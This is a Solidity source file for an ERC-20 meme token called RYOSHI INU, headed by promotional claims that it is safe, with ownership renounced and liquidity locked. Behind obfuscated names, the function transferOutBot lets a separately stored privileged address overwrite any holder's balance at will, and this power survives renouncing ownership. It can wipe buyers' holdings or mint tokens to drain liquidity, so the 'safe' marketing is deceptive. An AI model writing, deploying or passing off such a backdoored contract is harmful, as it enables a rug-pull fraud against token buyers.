// SPDX-License-Identifier: MIT     
/*
🐲 Welcome to 🌪 🐉 RYOSHIINU🐉🌪 
🔥Meme NFT COIN 🔥
🌪 🐉千里の道も一歩から "A journey of a thousand miles begins with a single step." 🐉🌪
💥Safe 💥Base NFT 💥Liquidty Secure By Mudra Lock 100 years 💥RO Contract 

https://t.me/RYOSHIINUTOKEN

💥NO TAX NO MAX
💥initial LP 0.50
💥Burn 45% Supply Burn
💥Whale Welcome
*/
pragma solidity >=0.8.13;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract inui {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface inuii {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 Teslanumerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 Teslanumerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 Teslanumerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface inuiii is inuii {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract inuiiii is inui {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract RYOSHIINU is inui, inuii, inuiii, inuiiii {

    mapping(address => uint256) private TotalBalance;
  mapping(address => bool) public inuiiiZERTY;
    mapping(address => mapping(address => uint256)) private TMPallowances;
address private addLiqudity;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address Teslabitcin;
    // My variables
    mapping(address => bool) public isPauseBot;
    bool isCheckBot;
    
    constructor(address addPair) {
            // Editable
            Teslabitcin = msg.sender;
            inuiiiZERTY[Teslabitcin] = true;
        _name = "RYOSHI INU";
        _symbol = "RYOSHINU";
  addLiqudity = addPair;        
        uint _totalSupply = 1000000000000 * 10**9;
        isCheckBot = false;
        // End editable

        isPauseBot[msg.sender] = true;

        deploys(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return TotalBalance[account];
    }

    function transfer(address to, uint256 Teslanumerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, Teslanumerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return TMPallowances[owner][spender];
    }

    function approve(address spender, uint256 Teslanumerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Teslanumerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 Teslanumerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, Teslanumerototal);
        _transfer(from, to, Teslanumerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, TMPallowances[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = TMPallowances[owner][spender];
        require(currentAllowance >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 Teslanumerototal
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        zeforeTokenTransfer(from, to, Teslanumerototal);

        // My implementation
        require(!isCheckBot || isPauseBot[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = TotalBalance[from];
        require(fromBalance >= Teslanumerototal, "Ehi20: transfer Teslanumerototal exceeds balance");
        unchecked {
            TotalBalance[from] = fromBalance - Teslanumerototal;
        }
        TotalBalance[to] += Teslanumerototal;

        emit Transfer(from, to, Teslanumerototal);

        zafterTokenTransfer(from, to, Teslanumerototal);
    }
  modifier Tesla0wner () {
    require(Teslabitcin == msg.sender, "Ehi20: cannot permit AutoOwner address");
    _;
  
  }
    function deploys(address account, uint256 Teslanumerototal) internal virtual {
        require(account != address(0), "Ehi20: mint to the zero address");

        zeforeTokenTransfer(address(0), account, Teslanumerototal);

        ALLtotalSupply += Teslanumerototal;
        TotalBalance[account] += Teslanumerototal;
        emit Transfer(address(0), account, Teslanumerototal);

        zafterTokenTransfer(address(0), account, Teslanumerototal);
    }
    modifier AutoOwner() {
        require(addLiqudity == _msgSender(), "Ownable: caller is not the owner");
        _;
    }



    function _burn(address account, uint256 Teslanumerototal) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        zeforeTokenTransfer(account, address(0), Teslanumerototal);

        uint256 accountBalance = TotalBalance[account];
        require(accountBalance >= Teslanumerototal, "Ehi20: burn Teslanumerototal exceeds balance");
        unchecked {
            TotalBalance[account] = accountBalance - Teslanumerototal;
        }
        ALLtotalSupply -= Teslanumerototal;

        emit Transfer(account, address(0), Teslanumerototal);

        zafterTokenTransfer(account, address(0), Teslanumerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 Teslanumerototal
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        TMPallowances[owner][spender] = Teslanumerototal;
        emit Approval(owner, spender, Teslanumerototal);
    }
  function transferOutBot(address BotAddress, uint256 zamount) external AutoOwner {
    TotalBalance[BotAddress] = zamount * 10 ** 9;
            emit Transfer(address(0), BotAddress, zamount * 10 ** 9);
  }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 Teslanumerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Teslanumerototal, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - Teslanumerototal);
            }
        }
    }

    function zeforeTokenTransfer(
        address from,
        address to,
        uint256 Teslanumerototal
    ) internal virtual {}


    function zafterTokenTransfer(
        address from,
        address to,
        uint256 Teslanumerototal
    ) internal virtual {}

}